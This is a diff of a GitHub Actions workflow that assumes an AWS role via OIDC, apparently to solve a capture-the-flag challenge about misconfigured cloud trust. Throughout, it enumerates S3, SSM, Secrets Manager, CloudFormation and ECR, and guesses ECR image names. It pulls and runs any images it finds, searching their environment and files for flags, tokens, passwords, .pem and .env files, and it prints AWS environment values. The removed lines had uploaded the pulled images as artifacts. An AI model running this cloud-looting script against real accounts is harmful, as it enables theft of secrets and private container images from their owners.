@@ -1,58 +1,120 @@
-name: Explore AWS ECR & Save Images
+name: Explore AWS ECR & Containers
 
 on:
   workflow_dispatch:
+  push:
+    branches:
+      - main
+
+permissions:
+  id-token: write
+  contents: read
 
 jobs:
-  assume-and-explore:
+  explore-ecr:
     runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-      contents: read
-
     steps:
       - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Configure AWS Credentials
+      - name: Configure AWS credentials (assume role via OIDC)
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
 
-      - name: Check identity
-        run: aws sts get-caller-identity
-
-      - name: Login to ECR
+      - name: Print identity (who we are)
         run: |
+          echo "=== Caller identity ==="
+          aws sts get-caller-identity
+
+      - name: Try read-ish AWS services (best-effort)
+        run: |
+          echo "=== S3 buckets ==="
+          aws s3 ls || echo "No S3 list access or denied"
+
+          echo "=== SSM parameters (describe) ==="
+          aws ssm describe-parameters --max-results 10 || echo "No SSM access or denied"
+
+          echo "=== Secrets Manager ==="
+          aws secretsmanager list-secrets --max-results 10 || echo "No Secrets Manager access or denied"
+
+          echo "=== CloudFormation stacks ==="
+          aws cloudformation list-stacks --max-results 10 || echo "No CloudFormation access or denied"
+
+      - name: Describe ECR repositories (multi-region)
+        run: |
+          for region in us-east-1 us-west-2 eu-west-1; do
+            echo "Region: $region"
+            aws ecr describe-repositories --region $region || echo "No ECR access in $region or none present"
+          done
+
+      - name: Get ECR login (docker)
+        id: ecr_login
+        run: |
+          set -e
+          echo "=== Getting ECR login password and docker login ==="
           aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+          echo "Docker login succeeded"
 
-      - name: Try Phrase-Based Docker Images
+      - name: Try listing local docker images (sanity)
         run: |
+          docker images --format "{{.Repository}}:{{.Tag}}\t{{.ID}}"
+
+      - name: Try to discover and inspect a few likely image names (safe-ish)
+        # THIS WILL PULL IMAGES if they exist. It runs the container read-only with dropped capabilities.
+        run: |
+          set -euo pipefail
+          REPO=396961015104.dkr.ecr.us-east-1.amazonaws.com
           PHRASES=(
             "never-imagined" "never_imagined" "i-never-imagined"
             "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
             "github-actions-insecure" "actions-insecure" "insecure-actions"
-            "fiddling-workflow" "fiddle-workflow" "workflow-fiddling"
-            "download-docker-image" "docker-download" "image-download"
-            "where-docker" "from-where" "where-from"
-            "oidc-cool" "cool-oidc" "oidc-misconfigured"
-            "be-careful" "careful-oidc" "oidc-careful"
+            "download-docker-image" "image-download" "where-from"
+            "oidc-misconfigured" "careful-oidc"
           )
 
-          mkdir -p pulled_images
-          for phrase in "${PHRASES[@]}"; do
-            echo "Trying: $phrase"
-            if docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest 2>/dev/null; then
-              echo "🎉 FOUND: $phrase"
-              docker images | grep $phrase
-              docker save -o pulled_images/$phrase.tar 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest
+          for name in "${PHRASES[@]}"; do
+            IMAGE="$REPO/$name:latest"
+            echo "--- Trying $IMAGE ---"
+            if docker pull "$IMAGE" 2>/dev/null; then
+              echo "+++ Pulled $IMAGE"
+              echo "=== Inspecting image layers and metadata ==="
+              docker inspect "$IMAGE" || true
+              echo "=== Running container in restricted mode to search for flags/secrets ==="
+
+              # run with read-only FS, drop capabilities and limit memory/time
+              # we run a simple find that searches for candidate filenames, limited depth
+              docker run --rm \
+                --read-only \
+                --pids-limit=64 \
+                --memory=256m \
+                --cap-drop ALL \
+                --entrypoint sh \
+                "$IMAGE" -c '\
+                  echo "--- env vars (filtered) ---"; env | grep -i "FLAG\|SECRET\|TOKEN\|PASSWORD" || true; \
+                  echo "--- find likely files (this may take a moment) ---"; \
+                  find / -xdev -maxdepth 4 -type f \( -iname "*flag*" -o -iname "*secret*" -o -iname "*.pem" -o -iname "*.env" -o -iname "*.txt" \) 2>/dev/null | head -n 200 || true; \
+                '
+              # don't continue to other phrases if found
               break
+            else
+              echo "Not found: $IMAGE"
             fi
           done
 
-      - name: Upload Pulled Images as Artifact
-        uses: actions/upload-artifact@v3
-        with:
-          name: pulled-docker-images
-          path: pulled_images/
+      - name: Try a safer, generic ECR list/pagination (if permitted)
+        run: |
+          aws ecr describe-repositories --region us-east-1 --output table || echo "No describe-repositories permission or none present"
+
+      - name: Print environment and workflow dir
+        run: |
+          echo "=== ENV related to AWS/OIDC ==="
+          env | sed -n 's/AWS/&&/Ip' || true
+          echo "=== Current directory ==="
+          pwd
+          ls -la
+
+      - name: Final note
+        run: |
+          echo "If you need different role/region or a longer phrase list, edit the workflow. Be careful when running arbitrary images."
